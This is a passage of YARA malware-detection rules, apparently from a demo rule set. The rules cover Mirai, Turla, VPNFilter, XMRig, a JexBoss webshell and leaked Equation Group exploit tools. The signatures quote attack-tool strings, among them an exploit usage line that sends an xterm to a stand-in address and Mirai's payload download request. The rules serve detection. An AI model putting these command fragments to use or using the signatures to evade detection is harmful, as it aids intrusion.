      $s13 = "OMI-1.4.2-4 - " ascii
      $s14 = "OMI-1.4.2-3 - " ascii
      $s15 = "OMI-1.4.2-2 - " ascii
      $s16 = "OMI-1.4.2-1 - " ascii
      $s17 = "OMI-1.4.1-1 - " ascii
      $s18 = "OMI-1.4.1-0 - " ascii
      $s19 = "OMI-1.4.0-6 - " ascii
   condition: 
      uint32be ( 0 ) == 0x7f454c46 and $a1 and 1 of ( $s* )
}

rule APT_LNX_Academic_Camp_May20_Eraser_1_RID33C6 : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:02:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "552245645cc49087dfbc827d069fa678626b946f4b71cb35fa4a49becd971363"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $sc2 = { E6 FF FF 48 89 45 D0 8B 45 E0 BA 00 00 00 00 BE 00 00 00 00 89 C7 E8 } 
      $sc3 = { E6 FF FF 89 45 DC 8B 45 DC 83 C0 01 48 98 BE 01 00 00 00 48 89 C7 E8 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them
}

rule APT_LNX_Academic_Camp_May20_Loader_1_RID33BB : APT DEMO FILE LINUX {
   meta:
      description = "Detects malware used in attack on academic data centers"
      author = "Florian Roth"
      reference = "https://csirt.egi.eu/academic-data-centers-abused-for-crypto-currency-mining/"
      date = "2020-05-16 15:00:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0efdd382872f0ff0866e5f68f0c66c01fcf4f9836a78ddaa5bbb349f20353897"
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $sc1 = { C6 45 F1 00 C6 45 F2 0A C6 45 F3 0A C6 45 F4 4A C6 45 F5 04 C6 45 F6 06 C6 45 F7 1B C6 45 F8 01 } 
      $sc2 = { 01 48 39 EB 75 EA 48 83 C4 08 5B 5D 41 5C 41 5D } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 10KB and all of them
}

rule APT_MAL_LNX_Penquin_Turla_Apr20_1_RID329A : APT DEMO FILE G0010 LINUX MAL RUSSIA {
   meta:
      description = "Detects Penquin Turla Linux malware"
      author = "Florian Roth"
      reference = "https://twitter.com/IntezerLabs/status/1247131160452509696"
      date = "2020-04-05 14:12:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "67d9556c695ef6c51abf6fbab17acb3466e3149cf4d20cb64d6d34dc969b6502"
      hash2 = "8ccc081d4940c5d8aa6b782c16ed82528c0885bbb08210a8d0a8c519c54215bc"
      tags = "APT, DEMO, FILE, G0010, LINUX, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "/root/.hsperfdata" ascii fullword
      $s2 = "Desc|     Filename     |  size  |state|" ascii fullword
      $s3 = "IPv6 address %s not supported" ascii fullword
      $s4 = "File already exist on remote filesystem !" ascii fullword
      $s5 = "/tmp/.sync.pid" ascii fullword
      $s6 = "'gateway' supported only on ethernet/FDDI/token ring/802.11/ATM LANE/Fibre Channel" ascii fullword
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 5000KB and 4 of them
}

rule MAL_Mirai_Nov19_1_RID2CC8 : DEMO FILE MAL {
   meta:
      description = "Detects Mirai malware"
      author = "Florian Roth"
      reference = "https://twitter.com/bad_packets/status/1194049104533282816"
      date = "2019-11-13 10:03:51"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "bbb83da15d4dabd395996ed120435e276a6ddfbadafb9a7f096597c869c6c739"
      hash2 = "fadbbe439f80cc33da0222f01973f27cce9f5ab0709f1bfbf1a954ceac5a579b"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "SERVZUXO" fullword ascii
      $s2 = "-loldongs" fullword ascii
      $s3 = "/dev/null" fullword ascii
      $s4 = "/bin/busybox" fullword ascii
      $sc1 = { 47 72 6F 75 70 73 3A 09 30 } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize <= 100KB and 4 of them
}

rule HKTL_LNX_Pnscan_RID2C57 : DEMO HKTL LINUX T1046 {
   meta:
      description = "Detects Pnscan port scanner"
      author = "Florian Roth"
      reference = "https://github.com/ptrrkssn/pnscan"
      date = "2019-05-27 09:45:01"
      score = 55
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "-R<hex list>   Hex coded response string to look for." fullword ascii
      $x2 = "This program implements a multithreaded TCP port scanner." ascii wide
   condition: 
      filesize < 6000KB and 1 of them
}

rule WebShell_JexBoss_WAR_1_RID2F1D : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Detects JexBoss versions in WAR form"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-11-08 11:43:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6271775ab144ce9bb9138bf054b149b5813d3beb96338993c6de35330f566092"
      hash2 = "6f14a63c3034d3762da8b3ad4592a8209a0c88beebcb9f9bd11b40e879f74eaf"
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $ = "jbossass" fullword ascii
      $ = "jexws.jsp" fullword ascii
      $ = "jexws.jspPK" fullword ascii
      $ = "jexws1.jsp" fullword ascii
      $ = "jexws1.jspPK" fullword ascii
      $ = "jexws2.jsp" fullword ascii
      $ = "jexws2.jspPK" fullword ascii
      $ = "jexws3.jsp" fullword ascii
      $ = "jexws3.jspPK" fullword ascii
      $ = "jexws4.jsp" fullword ascii
      $ = "jexws4.jspPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 4KB and 1 of them
}

rule MAL_ELF_LNX_Mirai_Oct10_2_RID2F3A : DEMO FILE LINUX MAL {
   meta:
      description = "Detects ELF malware Mirai related"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-27 11:48:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "fa0018e75f503f9748a5de0d14d4358db234f65e28c31c8d5878cc58807081c9"
      tags = "DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $c01 = { 50 4F 53 54 20 2F 63 64 6E 2D 63 67 69 2F 00 00 20 48 54 54 50 2F 31 2E 31 0D 0A 55 73 65 72 2D 41 67 65 6E 74 3A 20 00 0D 0A 48 6F 73 74 3A } 
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them
}

rule MAL_JRAT_Oct18_1_RID2BF9 : DEMO FILE MAL {
   meta:
      description = "Detects JRAT malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-10-11 09:29:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ce190c37a6fdb2632f4bc5ea0bb613b3fbe697d04e68e126b41910a6831d3411"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "/JRat.class" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
}

rule PUA_LNX_XMRIG_CryptoMiner_RID3009 : DEMO FILE LINUX MAL xmrig {
   meta:
      description = "Detects XMRIG CryptoMiner software"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-06-28 12:22:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2023-01-06"
      hash1 = "10a72f9882fc0ca141e39277222a8d33aab7f7a4b524c109506a407cd10d738c"
      tags = "DEMO, FILE, LINUX, MAL, xmrig"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "number of hash blocks to process at a time (don't set or 0 enables automatic selection o" fullword ascii
      $s2 = "'h' hashrate, 'p' pause, 'r' resume, 'q' shutdown" fullword ascii
      $s3 = "* THREADS:      %d, %s, aes=%d, hf=%zu, %sdonate=%d%%" fullword ascii
      $s4 = ".nicehash.com" ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 8000KB and ( 1 of ( $x* ) or 2 of them )
}

rule MAL_ELF_VPNFilter_1_RID2D6A : APT DEMO FILE LINUX MAL {
   meta:
      description = "Detects VPNFilter malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-05-24 10:30:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f8286e29faa67ec765ae0244862f6b7914fcdde10423f96595cb84ad5cc6b344"
      tags = "APT, DEMO, FILE, LINUX, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Login=" fullword ascii
      $s2 = "Password=" fullword ascii
      $s3 = "%s/rep_%u.bin" fullword ascii
      $s4 = "%s:%uh->%s:%hu" fullword ascii
      $s5 = "Password required" fullword ascii
      $s6 = "password=" fullword ascii
      $s7 = "Authorization: Basic" fullword ascii
      $s8 = "/tmUnblock.cgi" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 100KB and all of them
}

rule MAL_BurningUmbrella_Sample_11_RID31D5 : APT DEMO FILE MAL {
   meta:
      description = "Detects malware sample from Burning Umbrella report"
      author = "Florian Roth"
      reference = "https://401trg.pw/burning-umbrella/"
      date = "2018-05-04 13:39:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "278e9d130678615d0fee4d7dd432f0dda6d52b0719649ee58cbdca097e997c3f"
      tags = "APT, DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Resume.app/Contents/Java/Resume.jarPK" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 700KB and 1 of them
}

rule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE OFFICE {
   meta:
      description = "Detects EPS Word Exploit"
      author = "Florian Roth"
      reference = "Internal Research - ME"
      date = "2017-07-19 09:45:31"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, EXPLOIT, FILE, OFFICE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "word/media/image1.eps" ascii
      $s2 = "-la;7(la+" ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )
}

rule Mirai_1_May17_RID2B81 : DEMO FILE MAL {
   meta:
      description = "Detects Mirai Malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2017-05-12 09:09:21"
      score = 90
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "172d050cf0d4e4f5407469998857b51261c80209d9fa5a2f5f037f8ca14e85d2"
      hash2 = "9ba8def84a0bf14f682b3751b8f7a453da2cea47099734a72859028155b2d39c"
      hash3 = "a393449a5f19109160384b13d60bb40601af2ef5f08839b5223f020f1f83e990"
      tags = "DEMO, FILE, MAL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "GET /bins/mirai.x86 HTTP/1.0" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 5000KB and all of them )
}

rule SnakeTurla_Malware_May17_4_RID30B4 : DEMO FILE G0010 MAL RUSSIA {
   meta:
      description = "Detects Snake / Turla Sample"
      author = "Florian Roth"
      reference = "https://blog.fox-it.com/2017/05/03/snake-coming-soon-in-mac-os-x-flavour/"
      date = "2017-05-04 12:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2024-07-19"
      hash1 = "d5ea79632a1a67abbf9fb1c2813b899c90a5fb9442966ed4f530e92715087ee2"
      tags = "DEMO, FILE, G0010, MAL, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Install Adobe Flash Player.app/com.adobe.updatePK" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x4b50 and filesize < 5000KB and all of them )
}

rule EquationGroup_store_linux_i386_v_3_3_0_RID3570 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:13:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Failed to map file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "[!] Name has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and all of them )
}

rule EquationGroup_orleans_stride_sunos5_9_v_2_4_0_RID388D : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:26:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "6a30efb87b28e1a136a66c7708178c27d63a4a76c9c839b2fc43853158cb55ff"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "_lib_version" ascii
      $s2 = ",%02d%03d" fullword ascii
      $s3 = "TRANSIT" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_cursezinger_linuxrh7_3_v_2_0_0_RID382A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 18:09:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "af7c7d03f59460fa60c48764201e18f3bd3f72441fd2e2ff6a562291134d2135"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = ",%02d%03d" fullword ascii
      $s2 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
      $s3 = "__strtoll_internal" ascii
      $s4 = "__strtoul_internal" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 400KB and all of them )
}

rule EquationGroup_seconddate_ImplantStandalone_3_0_3_RID39CD : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 19:19:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d687aa644095c81b53a69c206eb8d6bdfe429d7adc2a57d87baf8ff8d4233511"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "EFDGHIJKLMNOPQRSUT" fullword ascii
      $s2 = "G8HcJ HcF LcF0LcN" fullword ascii
      $s3 = "GhHcJ0HcF@LcF0LcN8H" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and all of them )
}

rule EquationGroup_watcher_linux_i386_v_3_3_0_RID3631 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:45:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "ce4c9bfa25b8aad8ea68cc275187a894dec5d79e8c0b2f2f3ec4184dc5f402b8"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "invalid option `" fullword ascii
      $s8 = "readdir64" fullword ascii
      $s9 = "89:z89:%r%opw" fullword wide
      $s13 = "Ropopoprstuvwypypop" fullword wide
      $s17 = "Missing argument for `-x'." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 700KB and all of them )
}

rule EquationGroup_morerats_client_Store_RID357A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "619944358bc0e1faffd652b6af0600de055c5e7f1f1d91a8051ed9adf5a5b465"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "[-] Failed to mmap file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "Missing argument for `-x'." fullword ascii
      $s4 = "[!] Value has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and 2 of them )
}

rule EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a8d65593f6296d6d06230bcede53b9152842f1eee56a2a72b0a88c4f463a09c3"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "forceprismheader" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s3 = "forceprism" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 900KB and all of them )
}

rule EquationGroup_linux_exactchange_RID33CD : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      hash3 = "39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "[+] looking for vulnerable socket" fullword ascii
      $x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
      $x3 = "[+] %s socket ready, exploiting..." fullword ascii
      $x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_x86_linux_exactchange_RID3512 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:57:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
      hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
      $x2 = "[+] kernel stack size is %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and 1 of them )
}

rule EquationGroup_cryptTool_RID3093 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "The encryption key is " fullword ascii
      $s2 = "___tempFile2.out" ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_tnmunger_RID3033 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
      $s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 10KB and 1 of them )
}

rule EquationGroup_eh_1_1_0_RID2F3F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:49:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
      $x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
      $x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 1 of them )
}

rule EquationGroup_toast_v3_2_0_RID3116 : APT DEMO FILE G0020 LINUX {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b"
      tags = "APT, DEMO, FILE, G0020, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
      $s5 = "Roasting ->%s<- at ->%d:%d<-" ascii
      $s6 = "rbnoil -Roasting ->" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_sshobo_RID2F51 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Requested forwarding of port %d but user is not root." fullword ascii
      $x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
      $x3 = "~#  - list forwarded connections" fullword ascii
      $x4 = "packet_inject_ignore: block" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 600KB and all of them )
}

rule EquationGroup_telex_RID2EE5 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
      $x2 = "target is not vulnerable. exiting" fullword ascii
      $s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
      $s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_porkclient_RID30FE : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "-c COMMAND: shell command string" fullword ascii
      $s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
      $s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_electricslide_RID321F : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
      $x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
      $x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
      $x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_cmsd_RID2E6A : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
      $x2 = "error: not vulnerable" fullword ascii
      $s1 = "port=%d connected! " fullword ascii
      $s2 = "xxx.XXXXXX" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of ( $x* ) ) or ( 2 of them )
}

rule EquationGroup_eggbasket_RID3070 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
      tags = "APT, DEMO, FILE, G0020"
      minimum_yara = "3.5.0"
      
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_sambal_RID2F33 : APT DEMO FILE G0020 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
      author = "Florian Roth"
